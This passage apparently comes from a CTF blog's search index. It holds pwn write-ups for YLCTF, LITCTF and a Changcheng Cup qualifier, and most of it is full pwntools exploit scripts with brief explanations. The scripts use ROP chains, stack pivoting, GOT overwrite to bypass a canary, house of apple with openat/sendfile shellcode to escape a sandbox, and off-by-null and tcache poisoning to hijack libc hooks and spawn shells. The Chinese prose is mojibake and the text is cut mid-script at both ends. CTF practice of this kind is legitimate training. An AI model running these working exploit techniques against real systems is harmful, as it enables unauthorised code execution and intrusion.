               mov rsp,rbx
&#39;&#39;&#39;)
re_read += re_read1

rw = shellcraft.amd64.read(0x3, &amp;quot;rbx&amp;quot;, 0x40)
rw += shellcraft.amd64.write(0x1, &amp;quot;rbx&amp;quot;, 0x40)
rw = asm(rw)
re_read += rw
pause()

p.send(b&#39;a&#39;*0x49 + re_read)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;round-2&#34;&gt;Round 2&lt;/h1&gt;
&lt;h2 id=&#34;round-2-canary&#34;&gt;[Round 2] canary&lt;/h2&gt;
&lt;p&gt;é€‰é¡¹äºŒå¯ä»¥ç›´æ¥æ”¹rbpå’ŒretæŒ‡ä»¤ï¼Œå¯ä»¥è·³è¿‡canaryï¼ŒæŠŠæ ˆæ§åˆ¶åˆ°bssæ®µä¸Šï¼Œç„¶åç•™ä¸‹ä¸€ä¸ªè¦è·³å…¥çš„åœ°å€åˆ°bssé‡Œï¼Œç•™ä¸‹çš„æ–¹æ³•å°±æ˜¯æŠŠåœ°å€æ”¾åœ¨rbpçš„ä½ç½®ä¸Šï¼Œå¦‚æœæ”¾åˆ°retæŒ‡ä»¤å¤„ï¼Œé‚£ä¹ˆåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­å°±ä¼šæ”¹å˜ï¼Œç„¶åæŠŠrbpè¿åˆ°stack_chk_failçš„gotè¡¨ä¸Šæ–¹ï¼ŒæŠŠstack_chk_failçš„gotè¡¨æ”¹ä¸ºleave retï¼Œç„¶åå€ŸåŠ©ç•™åœ¨bssçš„åœ°å€è·³åˆ°giftå‡½æ•°ï¼Œåé¢é¢å°±æ˜¯å¸¸è§„çš„ret2libc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import LibcSearcher
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

# p = process(&#39;./pwn&#39;)
p = remote(&#39;challenge.yuanloo.com&#39;,33016)
# elf = ELF(&#39;./pwn&#39;)
bss = 0x000000000404060 + 0x900
got1 = 0x000000000404020
got = 0x000000000404028
main = 0x000000000401296
choice_1 = 0x000000000401258
choice_2 = 0x00000000040133F
leave = 0x0000000000401288

p.sendlineafter(&amp;quot;Do you want to enter other functions?\n&amp;quot;, b&#39;2&#39;)
payload = p64(bss - 0x10) + p64(main)
p.send(payload)
p.sendlineafter(&amp;quot;Do you want to enter other functions?\n&amp;quot;, b&#39;2&#39;)
pay = p64(bss + 0x20) + p64(main)
p.send(pay)
p.sendlineafter(&amp;quot;Do you want to enter other functions?\n&amp;quot;, b&#39;2&#39;)
pay = p64(0x000000000401241) + p64(0x00000000040128F)
p.send(pay)
# gdb.attach(p)
p.sendlineafter(&amp;quot;Do you want to enter other functions?\n&amp;quot;, b&#39;2&#39;)
pay = p64(got) + p64(choice_2)
p.send(pay)
pay = p64(0x404978) + p64(leave)
p.send(pay)


puts_plt = 0x0000000004010A0
puts_got = 0x000000000404018
main_addr = 0x000000000401258
pop_rdi_ret = 0x00000000004013e3
ret = pop_rdi_ret + 1

#gdb.attach(p)

payload = b&#39;a&#39;*64 + p64(bss) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.send(payload)

puts_addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))

libc_base = puts_addr - 0x000000000084420
system_addr = libc_base + 0x000000000052290
bin_addr = libc_base + 0x0000000001B45BD
onegadget = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
one_gadget = libc_base + onegadget[5]#3 4 

print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;sys = &amp;quot;,hex(system_addr))
print(&amp;quot;bin = &amp;quot;,hex(bin_addr))

#gdb.attach(p)
#pause()
pay = b&#39;b&#39;*64 + p64(bss) + p64(ret) + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)
p.send(pay)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-2-futureheap&#34;&gt;[Round 2] futureheap&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1729872807789.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å…ˆçœ‹initå‡½æ•°ï¼Œå‘ç°æœ‰ä¼ªéšæœºã€å¯æ‰§è¡Œæ®µã€ä¸€å †å¼‚æˆ–å’Œä¸€ä¸ªæ²™ç›’ï¼Œæ²™ç›’æ˜¯ç¦ç”¨äº†execveã€openå’Œwriteï¼Œç›´æ¥openatã€sendfileç»•è¿‡å³å¯ï¼Œæœ‰mmapä¸º7çš„æ®µå¾—çŸ¥æ‰“shellcodeï¼Œè¿™é‡Œæ³¨æ„ç›´æ¥æŠŠéšæœºæ•°ç§å­å¸ƒç½®ä¸ºtime(0)äº§ç”Ÿçš„éšæœºæ•°ä¸å¤ªä¸€æ ·ï¼Œéšæœºæ•°å‰ä¸¤ä½é¢˜ç›®å·²ç»ç»™å‡ºï¼Œçˆ†ç ´éšæœºæ•°ç§å­å³å¯ï¼Œç„¶åå°±å¯ä»¥æ ¹æ®å¼‚æˆ–å¾—åˆ°libcåŸºåœ°å€å’Œmmapç”³è¯·çš„åœ°å€äº†ï¼Œç„¶åçœ‹ä¸»é€»è¾‘&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1729872958655.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æ³¨é‡Šæ‰€ç¤ºï¼Œè¿˜å­˜åœ¨uafæ¼æ´ï¼Œå¤§å°æœ‰é™åˆ¶ï¼Œæ•´ä¸ªç¨‹åºçš„whileéƒ¨åˆ†æ— å›æ˜¾ï¼Œä¹Ÿæ— æ³•æ³„éœ²å †åœ°å€ï¼Œå¯ä»¥åˆ©ç”¨house of appleï¼Œåˆ©ç”¨ä¸€æ¬¡largebin attackåŠ«æŒioç»“æ„ä½“ï¼ŒæŠŠ wide_data åŠ«æŒåˆ°mmapç”³è¯·çš„åœ°å€ï¼Œå› ä¸ºå †åœ°å€ä¸çŸ¥é“ï¼Œmmapçš„åœ°å€çŸ¥é“å¹¶ä¸”å¯å†™ï¼Œç„¶ååœ¨mmapçš„åœ°å€é‡Œå†™å…¥ä¼ªé€ çš„wide_data ï¼Œåé¢å†™ä¸Šshellcodeï¼ŒåŠ«æŒç¨‹åºæ‰§è¡Œå†™å…¥çš„shellcodeå³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
import ctypes

context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
# io = process(&#39;./pwn&#39;)
io = remote(&amp;quot;challenge.yuanloo.com&amp;quot;,25509)
e = ELF(&#39;./pwn&#39;)
libc = e.libc

def dbg():
    gdb.attach(io)


def cmd(choice):
    io.sendline(str(choice).encode())

# å¤§å°åœ¨0x90-0x1000
# 32ä¸ª
def add(idx,size):
    cmd(1)
    sleep(0.5)
    io.sendline(str(idx).encode())
    sleep(0.5)
    io.sendline(str(size).encode())

def edit(idx,payload):
    cmd(2)
    sleep(0.5)
    io.sendline(str(idx).encode())
    sleep(0.5)
    io.sendline(payload)

def delete(idx):
    cmd(3)
    sleep(0.5)
    io.sendline(str(idx).encode())
    
def shellcode(payload):
    cmd(4)
    sleep(0.5)
    io.sendline(b&#39;74r0t#C@rd&#39;)
    sleep(0.5)
    # pause()
    io.sendline(payload)

def exit():
    cmd(5)


# gdb.attach(io,&amp;quot;b *$rebase(0x0000000000019FF)&amp;quot;)
lib = ctypes.CDLL(&#39;./1.so&#39;)

lib.random_number.restype = ctypes.c_int

io.sendlineafter(&amp;quot;Tell me your name, my dear: \n&amp;quot;,b&amp;quot;aaaaaaaa&amp;quot;)

io.recvuntil(&amp;quot;Wolf is &amp;quot;)
wolf = int(io.recvuntil(&amp;quot;.\n&amp;quot;, drop = True))
print(wolf)

io.recvuntil(&amp;quot;Sword is &amp;quot;)
Sword = int(io.recvuntil(&amp;quot;.\n&amp;quot;, drop = True))
print(Sword)

io.recvuntil(&amp;quot;Lion is &amp;quot;)
Lion = int(io.recvuntil(&amp;quot;.\n&amp;quot;, drop = True))
print(Lion)

io.recvuntil(&amp;quot;Snake is &amp;quot;)
Snake = int(io.recvuntil(&amp;quot;.\n&amp;quot;, drop = True))
print(Snake)

seed = lib.set_seed(wolf,Sword)
random1 = lib.random_number(seed)
print(&amp;quot;random1 = &amp;quot;,random1)
random2 = lib.random_number1(seed)
print(&amp;quot;random2 = &amp;quot;,random2)
random3 = lib.random_number2(seed)
print(&amp;quot;random3 = &amp;quot;,random3)
random4 = lib.random_number3(seed)
print(&amp;quot;random4 = &amp;quot;,random4)

setvbuf = wolf ^ random3 ^ Lion
print(&amp;quot;setvbuf = &amp;quot;,hex(setvbuf))
libcbase = setvbuf - 0x0815f0
print(&amp;quot;libcbase = &amp;quot;,hex(libcbase))
fortune = Sword ^ random4 ^ Snake
print(&amp;quot;fortune = &amp;quot;,hex(fortune))

_IO_list_all = libcbase + libc.sym[&#39;_IO_list_all&#39;]
io_wfile_jumps = libcbase + libc.sym[&#39;_IO_wfile_jumps&#39;]

add(0, 0x528)
add(1, 0x528)
add(2, 0x518)
delete(0)
add(3, 0x620)
edit(0, p64(0) + p64(0) + p64(0) + p64(_IO_list_all - 0x20))
delete(2)
# gdb.attach(io)
add(4, 0x620)

payload = b&#39;\x00&#39;*0xe0 + p64(fortune + 0x200)
payload += asm(shellcraft.openat(0xffffff9c,b&amp;quot;flag&amp;quot;,0))	
payload += asm(shellcraft.pread(3,fortune + 0x400,0x100,0))	
payload += asm(shellcraft.sendfile(1,3,0,0x100))
payload = payload.ljust(0x200,b&#39;\x00&#39;)
payload += b&#39;\x00&#39;*0x68 + p64(fortune + 0xe8)

shellcode(payload)
fake_io_file = p64(0)*2 + p64(1) + p64(2)
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b&#39;\0&#39;) + p64(fortune)  # _wide_data (A)
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps)  # vtable

cmd(2)
sleep(0.5)
io.sendline(b&#39;2&#39;)
sleep(0.5)
io.sendline(fake_io_file)
sleep(0.5)
io.sendline(b&#39;4&#39;)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-2-magicread&#34;&gt;[Round 2] magicread&lt;/h2&gt;
&lt;p&gt;æŸ¥çœ‹ç¨‹åºåªæœ‰ä¸€ä¸ªreadä¸”æº¢å‡ºäº†0x10ä¸ªå­—èŠ‚ï¼Œæ‰“æ ˆè¿ç§»ï¼Œè¿ç§»ä¸¤æ¬¡ï¼Œä¸€æ¬¡æ³„éœ²libcåœ°å€ä¸€æ¬¡å¾—åˆ°shellï¼Œç”±äºéœ€è¦å†æ¬¡readæ‰€ä»¥ç›´æ¥åˆ©ç”¨mainå‡½æ•°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

# p = process(&amp;quot;./pwn&amp;quot;)
p = remote(&amp;quot;challenge.yuanloo.com&amp;quot;,21148)
#elf = ELF(&amp;quot;./pwn&amp;quot;)

rdi = 0x0000000000400723
rsi_r15 = 0x0000000000400721
rbp = 0x0000000000400578
bss = 0x00000000601040 + 0x500
puts = 0x0000000004004E0
got = 0x000000000601018
leave = 0x0000000000400691

# gdb.attach(p)

payload = b&#39;a&#39;*0x40 + p64(bss + 0x100) + p64(0x000000000400675)
p.sendafter(&amp;quot;just read!\n&amp;quot;,payload)

pay = p64(rdi) + p64(got) + p64(puts) + p64(rbp) + p64(bss+0x300+0x100) + p64(0x000000000400675)
pay = pay.ljust(0x40,b&#39;\x00&#39;) + p64(0x601600 - 8) + p64(leave)
p.send(pay)
read_addr = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
print(hex(read_addr))
libc_base = read_addr - 0x00000000006F6A0
print(hex(libc_base))

#onegadget = [0xe3afe,0xe3b01,0xe3b04]
#one_gadget = libc_base + onegadget[0]

system = libc_base + 0x0000000000453A0
bin_sh = libc_base + 0x00000000018CE57
pay3 =(b&#39;a&#39;*8 + p64(rdi) + p64(bin_sh) + p64(rdi+1) + p64(system)).ljust(0x40,b&#39;\x00&#39;)
pay3 += p64(0x601900) + p64(leave)
p.send(pay3)
pause()
p.sendline(b&amp;quot;cat flag&amp;quot;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-2-ezstack2&#34;&gt;&lt;strong&gt;[Round 2] ezstack2&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;ret2libc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&#39;./pwn&#39;)
p = remote(&amp;quot;challenge.yuanloo.com&amp;quot;,39989)
#elf = ELF(&#39;./pwn&#39;)

puts_plt = 0x000000000400580
puts_got = 0x000000000601018
main_addr = 0x000000000400739
pop_rdi_ret = 0x0000000000400823
ret = 0x000000000040056e
bss = 0x000000000601060 + 0x700
#gdb.attach(p)

payload = b&#39;a&#39;*0x30 + p64(bss) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter(&amp;quot;good stack\n&amp;quot;,payload)

puts_addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))

libc_base = puts_addr - 0x84420
system_addr = libc_base + 0x52290
bin_addr = libc_base + 0x1b45bd
onegadget = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
one_gadget = libc_base + onegadget[5]#3 4 

print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;sys = &amp;quot;,hex(system_addr))
print(&amp;quot;bin = &amp;quot;,hex(bin_addr))

# gdb.attach(p)

pause()
pay = b&#39;a&#39;*0x30 + p64(0x404220) + p64(ret) + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)
p.send(pay)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-2-shortshell&#34;&gt;&lt;strong&gt;[Round 2] shortshell&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;è¯»å…¥äº”ä¸ªå­—èŠ‚çš„shellcodeï¼Œå­˜åœ¨åé—¨å‡½æ•°ï¼Œè®©ç¨‹åºè·³åˆ°åé—¨å‡½æ•°å³å¯ï¼ŒåŸºåœ°å€å¥½åƒä¸ä¸€æ ·ï¼Œè°ƒæ•´ä¸€ä¸‹åç§»å³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
p = remote(&amp;quot;challenge.yuanloo.com&amp;quot;,43268)
#p = process(&amp;quot;./pwn&amp;quot;)

#gdb.attach(p)
payload = b&amp;quot;\xE9\x02\xd2\xff\xff&amp;quot;
p.sendafter(&amp;quot;Welcome to YLCTF-PWN\n&amp;quot;, payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;round-3&#34;&gt;Round 3&lt;/h1&gt;
&lt;h2 id=&#34;round-3-secret&#34;&gt;[Round 3] Secret&lt;/h2&gt;
&lt;p&gt;ncåè¾“å…¥â€SuperSecretPassword\nâ€œå³å¾—flag&lt;/p&gt;
&lt;h2 id=&#34;round-3-ezstack3&#34;&gt;[Round 3] ezstack3&lt;/h2&gt;
&lt;p&gt;32ä½ï¼Œæ²¡å¼€PIEï¼Œæœ‰systemå‡½æ•°&lt;img src=&#34;https://l1u66.github.io//post-images/1729873036427.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€æ¬¡readç”¨æ¥æ³„éœ²æ ˆåœ°å€ï¼Œåœ¨æ ˆä¸Šå†™å…¥/bin/shå³å¯çŸ¥é“å…¶åœ°å€ï¼Œç¬¬äºŒæ¬¡readæ„é€ ROPé“¾å°±è¡Œ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

flag=1
if flag==1:
	p = process(&amp;quot;./pwn&amp;quot;)
else:
	p = remote(&amp;quot;challenge.yuanloo.com&amp;quot;,30305)

bss = 0x804C02C
pay = b&#39;a&#39;*48
p.sendafter(&amp;quot;Welcome to YLCTF stack3&amp;quot;,pay)
p.recv(48)
stack = u32(p.recv(4))
print(&amp;quot;stack = &amp;quot;,hex(stack))

edi_ebp = 0x080493c2
sys = 0x80490C0
sh = stack - 52
leave = 0x08049185
ret = 0x0804900e

payload =  p32(sys) + p32(bss+0x500) + p32(sh) + b&#39;/bin/sh\x00&#39;
payload = payload.ljust(48)
payload += p32(stack - 68) + p32(leave)
gdb.attach(p)

p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-3-null&#34;&gt;[Round 3] null&lt;/h2&gt;
&lt;p&gt;2.27ç‰ˆæœ¬çš„off by nullï¼Œæ„é€ unlinkå®ç°å †è¦†ç›–ä¹‹ååŠ«æŒfree_hookä¸ºonegadgetå³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
# io = process(&#39;./pwn&#39;)
io = remote(&amp;quot;challenge.yuanloo.com&amp;quot;,29653)
e = ELF(&#39;./pwn&#39;)
libc = e.libc
one = [0xe6aee, 0xe6af1, 0xe6af4]


def dbg():
    gdb.attach(io)


def cmd(choice):
    io.recvuntil(b&#39;:&#39;)
    io.sendline(str(choice).encode())

# å¤§å°åœ¨0x90-0x1000
# 32ä¸ª
def add(idx,size):
    cmd(1)
    io.recvuntil(b&#39;Index: &#39;)
    io.sendline(str(idx).encode())
    io.recvuntil(b&#39;Size &#39;)
    io.sendline(str(size).encode())


def delete(idx):
    cmd(4)
    io.recvuntil(b&#39;Index: &#39;)
    io.sendline(str(idx).encode())


def show(idx):
    cmd(3)
    io.recvuntil(b&#39;Index: &#39;)
    io.sendline(str(idx).encode())


def edit(idx,content=b&#39;deafbeef&#39;):
    cmd(2)
    io.recvuntil(b&#39;Index: &#39;)
    io.sendline(str(idx).encode())
    io.recvuntil(b&#39;Content: &#39;)
    io.sendline(content)

add(0,0xf8)#0
add(1,0xf8)#1
add(2,0xf8)#2
add(3,0xf8)#3
for i in range(20,27):
    add(i,0xf8)
for i in range(20,27):
    delete(i)
pay = b&#39;a&#39;*0xf0 + p64(0x200)
delete(0)
edit(1,pay)
delete(2)
for i in range(20,27):
    add(i,0xf8)
add(31,0xf8)
show(31)
io.recvuntil(b&#39;Content: &#39;)
libc_base = u64(io.recv(6).ljust(8,b&#39;\x00&#39;)) - 4112272
print(&amp;quot;libc_base = &amp;quot;,hex(libc_base))
free_hook = libc_base + libc.sym[&#39;__free_hook&#39;] 
one = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]

add(30,0xf8)
delete(3)
delete(30)
edit(1,p64(free_hook))
add(11,0xf8)
add(12,0xf8)
edit(12,p64(libc_base + one[2]))
# gdb.attach(io)
delete(11)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">æºé²æ¯2024</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/litctfguo-wai/"" data-c="
          &lt;p&gt;è¡¥ä¸ªwp&lt;br&gt;
ä¸»è¦æ˜¯ä¸€é“æ²¡æœ‰ä»»ä½•è¾“å‡ºçš„readçš„å¼€äº†æ²™ç›’çš„æ ˆæº¢å‡ºï¼Œåˆ©ç”¨åŸç†ï¼šå…ˆåœ¨bssæ®µè¯»å–éœ€è¦æ‰§è¡Œçš„ropé“¾ï¼Œç„¶åå°†readçš„gotè¡¨æ”¹ä¸€ä¸ªå­—èŠ‚æˆsyscallï¼Œç¨‹åºæ­£å¸¸é€€å‡ºä¼šæœ‰ä¸€ä¸ªeaxç½®é›¶ç„¶åleave outçš„æ“ä½œï¼Œè¯¦ç»†çœ‹exp&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)


# p = process(&#39;./main&#39;)
p = remote(&amp;quot;litctf.org&amp;quot;,31771)
elf = ELF(&#39;./main&#39;)
libc = elf.libc

bss = 0x000000000404000 + 0x700
pop_rdi = 0x00000000004013d3
pop_rsi_r15 = 0x00000000004013d1
read_got = 0x000000000404030
read_plt = 0x0000000004010A0
rax_0_leave_ret = 0x0000000000401364
payload = b&#39;a&#39;*32 + p64(bss) + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(read_plt)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0) + p64(read_plt)
payload += p64(pop_rdi) + p64(1) + p64(read_plt)
payload += p64(rax_0_leave_ret) 
p.send(payload)

# gdb.attach(p)

pause()
pay = p64(bss + 0x100) + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(0x404718) + p64(0) + p64(read_plt)
p.send(pay)

pause()
pay = p8(0xf0)
p.send(pay)
libc_base = u64(p.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x00000000010E1F0
print(&amp;quot;libc_base = &amp;quot;,hex(libc_base))

pop_rax = 0x0000000000036174 + libc_base
pop_rdx_r12 = 0x0000000000119431 + libc_base
#close
rop = b&amp;quot;./flag.txt&amp;quot;
rop = rop.ljust(0x10,b&#39;\x00&#39;)
rop+=p64(pop_rdi)
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(3)
rop+=p64(read_plt)

#open
rop+=p64(pop_rdi)
rop+=p64(0x404718)# &#39;flag&#39; address
rop+=p64(pop_rsi_r15)
rop+=p64(0)
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(2)
rop+=p64(read_plt)

#read
rop+=p64(pop_rdi)
rop+=p64(0)
rop+=p64(pop_rsi_r15)
rop+=p64(bss - 0x400)# flag store address
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(0)
rop+=p64(read_plt)

#write
rop+=p64(pop_rdi)
rop+=p64(1)
rop+=p64(pop_rsi_r15)
rop+=p64(bss - 0x400)# flag store address
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(1)
rop+=p64(read_plt)
pause()
p.send(rop)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">litctfï¼ˆå›½å¤–ï¼‰</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/di-si-jie-chang-cheng-bei-wang-luo-an-quan-da-sai-ji-jing-jin-ji-wang-luo-an-quan-ji-neng-jing-sai-chu-sai/"" data-c="
          &lt;p&gt;å°±å·®ä¸€åè¿›å†³èµ›ï¼ŒKylin_Heapç­¾åˆ°å †é¢˜æœ¬åœ°é€šäº†ï¼Œè¿œç«¯åç§»æœ‰ç‚¹é—®é¢˜æ²¡æ•´å‡ºæ¥ï¼Œåˆšå‡ºä»¥ä¸ºæ˜¯å‰é¢é‚£é“å†…æ ¸é¢˜æ¼”åŒ–å‡ºæ¥çš„å†…æ ¸å †å°±æ²¡çœ‹ï¼Œåé¢æ²¡æ—¶é—´äº†ï¼Œè¯¶ï¼Œè¿™é“å‡ºæ¥å¿…è¿›å†³èµ›å•Šï¼Œæˆ‘æ˜¯é˜Ÿä¼ç½ªäººğŸ˜­ğŸ˜­ğŸ˜­&lt;/p&gt;
&lt;h1 id=&#34;flowershop&#34;&gt;FlowerShop&lt;/h1&gt;
&lt;p&gt;æœ‰ä¸ªæ ˆæº¢å‡ºæ£€æµ‹å¯ä»¥ç›´æ¥ç»•è¿‡ï¼Œç„¶åä¿®æ”¹é’±æ•°ä¹°magicæä¾›/bin/shå­—ç¬¦ä¸²ï¼Œshopå‡½æ•°ä¸­æœ‰ä¸ªcheckå‡½æ•°ï¼Œå¦‚æœä¹°äº†ä¸¤ä¸ªaï¼Œä¸€ä¸ªbè¿˜æœ‰ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œé¢˜ç›®ç»™äº†systemå‡½æ•°ï¼Œå¯ä»¥ç›´æ¥æ‹¿åˆ°shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
p = remote(&amp;quot;8.147.131.74&amp;quot;,27260)
# p = process(&amp;quot;./pwn1&amp;quot;)
rdi = 0x0000000000400f13
ret = 0x00000000004006f6

pay = b&#39;a&#39;*52 + b&#39;pwn&#39; + b&#39;\x00&#39; + p64(0x1234)
p.sendlineafter(&amp;quot;è¯·è¾“å…¥ä½ çš„å§“å:\n&amp;quot;,pay)
p.sendlineafter(&amp;quot;è¯·è¾“å…¥ä½ çš„é€‰é¡¹:\n&amp;quot;,b&#39;a&#39;)
p.sendlineafter(&amp;quot;è¯·è¾“å…¥è´­ä¹°çš„å•†å“åºå·:\n&amp;quot;,b&#39;a&#39;)
p.sendlineafter(&amp;quot;ä½ æƒ³è¦ç»§ç»­ä¹°èŠ±å—? 1/0\n&amp;quot;,b&#39;1&#39;)
p.sendlineafter(&amp;quot;è¯·è¾“å…¥è´­ä¹°çš„å•†å“åºå·:\n&amp;quot;,b&#39;a&#39;)
p.sendlineafter(&amp;quot;ä½ æƒ³è¦ç»§ç»­ä¹°èŠ±å—? 1/0\n&amp;quot;,b&#39;1&#39;)
p.sendlineafter(&amp;quot;è¯·è¾“å…¥è´­ä¹°çš„å•†å“åºå·:\n&amp;quot;,b&#39;b&#39;)
p.sendlineafter(&amp;quot;ä½ æƒ³è¦ç»§ç»­ä¹°èŠ±å—? 1/0\n&amp;quot;,b&#39;1&#39;)
# gdb.attach(p)
p.sendlineafter(&amp;quot;è¯·è¾“å…¥è´­ä¹°çš„å•†å“åºå·:\n&amp;quot;,b&#39;c&#39;)
payload = b&#39;0&#39;*24 + p64(rdi) + p64(0x000000000601840) + p64(ret) + p64(0x000000000400730)
p.sendlineafter(&amp;quot;ä½ æƒ³è¦ç»§ç»­ä¹°èŠ±å—? 1/0\n&amp;quot;,payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;kylin_heap&#34;&gt;Kylin_Heap&lt;/h1&gt;
&lt;p&gt;2.31çš„ä¿®æ”¹åçš„libcï¼Œlibcåç§»æœ‰äº›ä¸åŒï¼Œå­˜åœ¨edit after freeï¼Œuafæ¼æ´ï¼Œaddæ— é™åˆ¶å¤§å°ï¼Œæ³„éœ²å‡ºlibcä¹‹åç›´æ¥ä¿®æ”¹tcache binçš„nextæŒ‡é’ˆåŠ«æŒhook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
r = process(&#39;./pwn&#39;)
#r = remote(&amp;quot;8.147.134.241&amp;quot;,45324)
e = ELF(&#39;./pwn&#39;)
libc = ELF(&#39;./libc-2.31-0kylin9.2k0.2.so&#39;)  # ubuntu22æ‰“æœ¬åœ°
#one = [0xe6c7e, 0xe6c81, 0xe6c84]
one = [0xe3afe, 0xe3b01, 0xe3b04]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b&#39;What will you do, adventurer? &#39;)
    r.sendline(str(choice).encode())


def add(size, content=b&#39;a&#39;): #ä»0å¼€å§‹ æœ€å¤š20ä¸ªå †
    cmd(1)
    r.recvuntil(b&#39;Enter the size of the block you wish to summon (1 to 1280 bytes): &#39;)
    r.sendline(str(size).encode())
    r.recvuntil(b&#39;bytes):\n&#39;)
    r.send(content)


def free(idx):
    cmd(2)
    r.recvuntil(b&#39;Which block will you let go? Enter the index (0-19): &#39;)
    r.sendline(str(idx).encode())


def show(idx):
    cmd(4)
    r.recvuntil(b&amp;quot;Which block&#39;s secrets would you like to uncover? Enter the index (0-19): &amp;quot;)
    r.sendline(str(idx).encode())


def edit(idx, content=b&#39;deafbeef&#39;):
    cmd(3)
    r.recvuntil(b&#39;Which block would you like to rewrite? Enter the index (0-19): &#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;bytes):\n&#39;)
    r.send(content)


def exit():
    cmd(5)

add(0x20,b&#39;a&#39;)#0
add(0x20,b&#39;a&#39;)#1
add(0x418,b&#39;a&#39;)#2
add(0x418,b&#39;a&#39;)#3
add(0x418,b&#39;a&#39;)#4
add(0x418,b&#39;a&#39;)#5
free(2)
show(2)
r.recvuntil(&amp;quot;Revealing the contents of block [2]:\n&amp;quot;)
libcbase = u64(r.recv(6).ljust(8,b&#39;\x00&#39;)) - 2018272
print(&amp;quot;libc = &amp;quot;,hex(libcbase))
free(0)
free(1)
show(1)
r.recvuntil(&amp;quot;Revealing the contents of block [1]:\n&amp;quot;)
heap_base = u64(r.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x6c0 + 1056
print(&amp;quot;heap_base = &amp;quot;,hex(heap_base))

hook = libcbase + libc.sym[&amp;quot;__malloc_hook&amp;quot;]
edit(1,p64(hook))
add(0x20,b&#39;a&#39;)#6
add(0x20,p64(libcbase + one[1]))#7
cmd(1)
